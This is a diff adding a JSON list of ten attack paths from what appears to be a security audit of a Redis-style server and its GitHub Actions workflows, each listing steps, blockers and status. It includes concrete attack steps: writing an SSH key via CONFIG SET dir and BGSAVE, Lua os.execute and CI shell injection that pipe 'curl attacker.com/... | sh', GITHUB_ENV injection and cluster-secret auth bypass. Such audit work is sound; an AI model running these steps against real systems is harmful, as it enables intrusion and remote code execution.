@@ -1,0 +1,130 @@
+[
+  {
+    "id": "AP-001",
+    "name": "moduleLogRaw stack buffer overflow via long module name",
+    "finding": "FIND-001",
+    "steps": [
+      {"step": 1, "action": "Craft malicious .so module with name > 1021 chars in RedisModule_OnLoad(ctx, ..., name)", "result": "Module name stored in module->name without length validation"},
+      {"step": 2, "action": "Load module via MODULE LOAD /path/to/malicious.so (requires admin + enable-module-command)", "result": "Module loaded, name stored in module struct"},
+      {"step": 3, "action": "Trigger any RM_Log call from within the module (or Redis logging the module name)", "result": "moduleLogRaw called: snprintf returns name_len > 1024, vsnprintf writes past msg[1024] stack buffer"}
+    ],
+    "proximity": 4,
+    "blockers": ["Requires enable-module-command != no (default blocked)", "Requires admin authentication", "Requires ability to upload .so to filesystem", "Stack canary may prevent exploitation on modern systems"],
+    "status": "confirmed"
+  },
+  {
+    "id": "AP-002",
+    "name": "CONFIG SET dir + BGSAVE write-anywhere to filesystem",
+    "finding": "FIND-002",
+    "steps": [
+      {"step": 1, "action": "Authenticate to Redis (or exploit default no-auth config)", "result": "Authenticated session with CONFIG SET access"},
+      {"step": 2, "action": "CONFIG SET dir /root/.ssh", "result": "chdir() changes working directory to /root/.ssh"},
+      {"step": 3, "action": "CONFIG SET dbfilename authorized_keys", "result": "RDB filename set to authorized_keys"},
+      {"step": 4, "action": "SET payload 'ssh-rsa AAAA... attacker@host'", "result": "Attacker SSH key stored in Redis memory"},
+      {"step": 5, "action": "BGSAVE", "result": "RDB written to /root/.ssh/authorized_keys with SSH key embedded in Redis data section"}
+    ],
+    "proximity": 3,
+    "blockers": ["enable-protected-configs defaults to no (blocks CONFIG SET dir)", "Requires authentication if requirepass set", "Protected mode blocks remote unauthenticated access"],
+    "status": "confirmed"
+  },
+  {
+    "id": "AP-003",
+    "name": "Lua sandbox escape via os.execute for RCE",
+    "finding": "FIND-003",
+    "steps": [
+      {"step": 1, "action": "Authenticate to Redis (or exploit default no-auth config)", "result": "Authenticated session with EVAL access (@scripting ACL)"},
+      {"step": 2, "action": "EVAL 'return os.execute(\"id\")' 0", "result": "Lua os.execute calls system(\"id\"). Readonly table protection does not block function calls (lvm.c:141 only checks SETTABLE). Expected: returns exit code 0 and 'id' output sent to Redis process stdout"},
+      {"step": 3, "action": "EVAL 'os.execute(\"curl attacker.com/shell.sh | sh\")' 0", "result": "Arbitrary command execution as Redis process user"}
+    ],
+    "proximity": 7,
+    "blockers": ["Requires authentication (requirepass or ACL)", "Protected mode blocks remote unauth access", "os.execute output goes to Redis stdout, not client — need out-of-band exfil"],
+    "status": "confirmed"
+  },
+  {
+    "id": "AP-004",
+    "name": "MODULE LOAD arbitrary .so for RCE",
+    "finding": "FIND-004",
+    "steps": [
+      {"step": 1, "action": "Authenticate as admin user", "result": "Admin session"},
+      {"step": 2, "action": "MODULE LOAD /path/to/attacker.so", "result": "dlopen loads attacker's shared library, executing RedisModule_OnLoad with full process privileges"}
+    ],
+    "proximity": 3,
+    "blockers": ["enable-module-command defaults to no", "Requires admin ACL", "Requires .so already on filesystem (no upload mechanism)"],
+    "status": "confirmed"
+  },
+  {
+    "id": "AP-005",
+    "name": "Cluster bus MEET injection to join cluster",
+    "finding": "FIND-005",
+    "steps": [
+      {"step": 1, "action": "Connect to cluster bus port (client_port + 10000)", "result": "TCP connection accepted (up to 1000/cycle)"},
+      {"step": 2, "action": "Send CLUSTERMSG_TYPE_MEET message with valid 'RCmb' signature and protocol version", "result": "clusterProcessPacket processes MEET from unknown sender"},
+      {"step": 3, "action": "New node added to cluster via clusterAddNode at cluster_legacy.c:2962", "result": "Attacker node is now part of the cluster, can receive gossip, participate in failover voting, inject PUBLISH messages"}
+    ],
+    "proximity": 8,
+    "blockers": ["Requires network access to cluster bus port", "Cluster mode must be enabled", "TLS for cluster bus mitigates (tls-cluster yes)"],
+    "status": "confirmed"
+  },
+  {
+    "id": "AP-006",
+    "name": "Replication MITM for RDB injection",
+    "finding": "FIND-006",
+    "steps": [
+      {"step": 1, "action": "Position as MITM between master and replica on the replication TCP connection", "result": "Intercept PSYNC handshake"},
+      {"step": 2, "action": "Forge +FULLRESYNC response with $<size> header and crafted RDB payload", "result": "Replica accepts RDB and loads via rdbLoadRioWithLoadingCtx"},
+      {"step": 3, "action": "Crafted RDB contains keys with attacker-controlled data (or exploits RDB parser bugs)", "result": "Replica's dataset replaced with attacker data"}
+    ],
+    "proximity": 5,
+    "blockers": ["Requires MITM position on network", "masterauth mitigates (but defaults to NULL)", "TLS mitigates (but defaults to off)", "RDB parser is relatively hardened"],
+    "status": "uncertain"
+  },
+  {
+    "id": "AP-007",
+    "name": "Cluster secret sniffing to ACL bypass via internal auth",
+    "finding": "FIND-007",
+    "steps": [
+      {"step": 1, "action": "Passively capture cluster bus traffic (plaintext if no TLS)", "result": "Extract 40-hex-char cluster secret from PING extension messages"},
+      {"step": 2, "action": "Connect to client port and send AUTH 'internal connection' <secret>", "result": "internalAuth sets c->user = NULL and c->authenticated = 1"},
+      {"step": 3, "action": "Execute any command — all ACL checks return ACL_OK for NULL user", "result": "Full unrestricted access: CONFIG SET, MODULE LOAD, DEBUG, etc."}
+    ],
+    "proximity": 6,
+    "blockers": ["Requires passive sniffing on cluster bus network segment", "tls-cluster mitigates", "Requires cluster mode enabled"],
+    "status": "confirmed"
+  },
+  {
+    "id": "AP-008",
+    "name": "GitHub Actions shell injection via workflow_dispatch test_args",
+    "finding": "FIND-008",
+    "steps": [
+      {"step": 1, "action": "User with write access triggers workflow_dispatch with test_args containing '; curl attacker.com/exfil | sh; #'", "result": "daily.yml jobs start on GitHub runner"},
+      {"step": 2, "action": "run: step executes ./runtest --accurate --verbose --dump-logs ; curl attacker.com/exfil | sh; #", "result": "Arbitrary command execution on CI runner with GITHUB_TOKEN access"}
+    ],
+    "proximity": 7,
+    "blockers": ["Requires repo write access (not external contributor)", "GITHUB_TOKEN scoped to repo permissions"],
+    "status": "confirmed"
+  },
+  {
+    "id": "AP-009",
+    "name": "GITHUB_ENV injection via use_repo for attacker-controlled checkout",
+    "finding": "FIND-009",
+    "steps": [
+      {"step": 1, "action": "Dispatch workflow with use_repo containing 'attacker/malicious-redis\\nSECRET_EXFIL=true'", "result": "echo >> GITHUB_ENV injects additional environment variables"},
+      {"step": 2, "action": "actions/checkout uses poisoned env.GITHUB_REPOSITORY to clone attacker/malicious-redis", "result": "Attacker-controlled code checked out"},
+      {"step": 3, "action": "Subsequent make/test steps compile and run attacker code on CI runner", "result": "Arbitrary code execution"}
+    ],
+    "proximity": 7,
+    "blockers": ["Requires repo write access"],
+    "status": "confirmed"
+  },
+  {
+    "id": "AP-010",
+    "name": "SHA1 weak crypto in utility scripts",
+    "finding": "FIND-010",
+    "steps": [
+      {"step": 1, "action": "Attempt to forge matching SHA1 rolling checksum for different dataset", "result": "Computationally infeasible due to chaining construction"}
+    ],
+    "proximity": 0,
+    "blockers": ["Non-security use context", "Chaining prevents practical collision exploitation", "Utility scripts only, not server"],
+    "status": "blocked"
+  }
+]
